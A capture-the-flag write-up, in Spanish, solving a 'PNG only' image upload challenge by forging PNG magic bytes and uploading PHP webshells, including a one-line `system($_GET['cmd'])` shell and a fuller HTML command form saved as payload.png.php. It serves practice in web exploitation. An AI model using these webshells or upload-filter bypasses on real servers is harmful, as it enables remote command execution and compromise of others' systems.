
# Descripcion
I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance.

## Hints
None

# Solucion
Lo primero que hay que hacer es hacer un reconocimiento en la pagina. En este caso, solo tiene la opcion de subir archivos. En el codigo fuente nada sospechoso. Busque en el robots.txt y encontre informacion interesante.

Ahora se donde se alojan los archivos que se suben. Nos menciona que verifica que los primeros bytes para saber si es un png.
Ahora localizo los bytes de un archivo png con esta pagina:

- https://en.wikipedia.org/wiki/List_of_file_signatures
Ahora creo un archivo php con una webshell:
```
<?php system($_GET['cmd']); ?>
```

usamos `hexeditor` para modificar los bytes del php a png. 
Reescribimos el nombre y ponemos la extension `.png`. 
Subimos la imagen y accedemos a ella

Por medio de la url, agrego el parametro `?cmd=id` para realizar la inyeccion de codigo, pero no funciono.

En este caso, busco una webshell en php en google y uso este:

```
|   |
|---|
PNG
|<html>|
||<body>|
||<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">|
||<input type="TEXT" name="cmd" autofocus id="cmd" size="80">|
||<input type="SUBMIT" value="Execute">|
||</form>|
||<pre>|
||<?php|
||if(isset($_GET['cmd']))|
||{|
||system($_GET['cmd'] . ' 2>&1');|
||}|
||?>|
||</pre>|
||</body>|
||</html>|

```

Ahora, nombre este archivo como `payload.png.php`. Ahora subo este archivo y lo buscamos:

Vemos que interpreto correctamente la webshell. Hacemos un `ls ..` para ver los archivos del directorio padre y justo ahi esta la flag.

Ya con el nombre de la flag, accedo a flag:

![[images/flagTrickster.png]]